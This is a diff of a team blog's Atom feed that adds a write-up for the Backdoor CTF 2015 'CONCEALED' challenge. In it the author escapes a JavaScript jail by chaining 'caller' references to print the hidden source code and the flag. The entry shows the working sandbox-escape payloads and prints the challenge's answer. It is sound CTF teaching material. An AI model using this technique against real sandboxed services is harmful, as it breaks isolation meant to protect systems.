@@ -4,7 +4,7 @@
   <title><![CDATA[GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-04-03T02:17:20+04:30</updated>
+  <updated>2015-04-03T02:34:21+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -12,6 +12,128 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Backdoor CTF 2015 - CONCEALED Writeup]]></title>
+    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup/"/>
+    <updated>2015-04-03T02:33:31+04:30</updated>
+    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup</id>
+    <content type="html"><![CDATA[<p><strong>Backdoor 2015 CONCEALED Writeup</strong><br/>
+<strong>Point = 100</strong><br/>
+<strong>Category = Exploit</strong></p>
+
+<blockquote><p>All paths have been concealed. Get the hidden flag: nc hack.bckdr.in 8005. Submit sha-256 of the flag</p></blockquote>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc hack.bckdr.in 8005
+</span><span class='line'>######################################
+</span><span class='line'>####           CONCEAL            ####
+</span><span class='line'>######################################
+</span><span class='line'>
+</span><span class='line'>Welcome to CONCEAL
+</span><span class='line'>You have access to object named sandboxed and its functions 
+</span><span class='line'>Rest everything is sandboxed, don't be a jerk and break something
+</span><span class='line'>Wrap your code in a function and return what you want as output
+</span><span class='line'>Flag is hidden somewhere in the code. 
+</span><span class='line'>Get the flag :D!
+</span><span class='line'>
+</span><span class='line'>home@jail:$ 
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>First of all as banner says we should use all our payload as a function like :</p>
+
+<!--more-->
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>home@jail:$ function exploit() { return "GeeksSpeak"; }
+</span><span class='line'>GeeksSpeak
+</span><span class='line'>home@jail:$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>After some diging into the the challenge, trying to break the jail and so on, reading banner carefully indicates that the flag is in the code so i should read codes but how?</p>
+
+<p>In javascript we can use arguments.caller to see which function calls our current function so i made up an example and tested it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>home@jail:$ function exploit() { return exploit.caller.toString(); }
+</span><span class='line'>function () {return (function exploit() { return exploit.caller.toString(); })()}
+</span><span class='line'>home@jail:$ function exploit() { return (exploit.caller).caller.toString(); }
+</span><span class='line'>function () {
+</span><span class='line'>        if (!(this instanceof Script)) {
+</span><span class='line'>          throw new TypeError('invalid call to ' + f);
+</span><span class='line'>        }
+</span><span class='line'>        return ns[f].apply(ns, arguments);
+</span><span class='line'>      }
+</span><span class='line'>home@jail:$ 
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>this proved my idea, so i used caller repeatedly and finally got the flag as bellow:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>home@jail:$ function exploit() { return ((((((((exploit.caller).caller).caller).caller).caller).caller).caller).caller).caller.toString(); }
+</span><span class='line'>function (err, line) {
+</span><span class='line'>
+</span><span class='line'>    // flag : 50_y0u_f1n4lly_f0und_17
+</span><span class='line'>
+</span><span class='line'>    if (err && wait === false) {
+</span><span class='line'>      return callback(err);
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    var against = {},
+</span><span class='line'>        numericInput,
+</span><span class='line'>        isValid;
+</span><span class='line'>
+</span><span class='line'>    if (line !== '') {
+</span><span class='line'>      if (schema.properties[propName]) 
+</span><span class='line'>      [..stripped..]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and sha256 of the <code>50_y0u_f1n4lly_f0und_17</code> gives us another 150pts.</p>
+
+<p>HAMIDx9</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Backdoor CTF 2015 - ECHO Writeup]]></title>
